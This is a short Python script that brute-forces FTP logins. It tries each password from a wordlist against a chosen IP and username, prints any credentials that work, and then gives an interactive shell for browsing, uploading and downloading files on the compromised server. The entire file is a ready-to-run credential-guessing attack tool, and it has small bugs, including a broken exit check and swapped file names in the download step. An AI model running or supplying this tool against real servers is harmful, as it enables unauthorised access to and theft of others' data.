import ftplib
import socket

ip = input('Insert IP address for connection:\t')
username = input('Enter username:\t')
password = input('Enter password list:\t')
with open(password,'r') as password_list:
    for p in password_list:
        p = ''.join(p.split("\n"))
        try:
            session = ftplib.FTP()
            session.connect(f'{ip}',21)
            session.login(username, p)
            print(f'Login success!\nUsername: {username} , Password: {p}')
            print('=====================================================')
            while True:
                command = input('Please choose the command (dir, pwd, get, put, cwd, or exit to close):\t').lower()
                if command == "pwd":
                    print('================================================================')
                    print(f'The working directory is -------> {session.pwd()}\n')
                    print('=====================================================')
                elif command == 'dir':
                    print('================================================================')
                    print('The files of the directory is:\n')
                    session.dir()
                    print('=======================================================')
                elif command == "put":
                    print('================================================================')
                    file_upload = input('Enter the file that you would like to upload:\t')
                    put_file = open(file_upload, 'rb')
                    file_up_name = input('How would you like save the file in the server?\t')
                    session.storbinary(f'stor {file_up_name}', put_file)
                    put_file.close()
                    print('==========================================================')
                elif command == 'get':
                    print('================================================================')
                    session.dir()
                    file_download = input('Choose the file you want to download from the server:\t')
                    get_file = open(file_download, 'wb')
                    file_down_name = input('How would you like save the file in your computer?\t')
                    session.retrbinary(f'retr {file_down_name}', get_file.write) #
                    get_file.close()
                    print('================================================================')
                elif command == 'cwd':
                    print('================================================================')
                    print(f'The working directory is -------> {session.pwd()}\n')
                    change_directory = input('Which directory would you like to go to?\t')
                    session.cwd(change_directory)
                    print(f'The working directory is -------> {session.pwd()}\n')
                    print('================================================================')
                elif command == exit:
                    print('The session is closed ...')
                    session.close()
                    break
                else:
                    print("Wrong Command ...")
                    ask = input('Would you like to exit y/n?\t').lower()[0]
                    if ask == 'y':
                        print('The session is closed ...')
                        session.close()
                        break
                    else:
                        continue
        except ftplib.error_perm:
            print(f'Wrong Credentials\n Username:{username} , Password:{p}')
            
  # GLITCH422
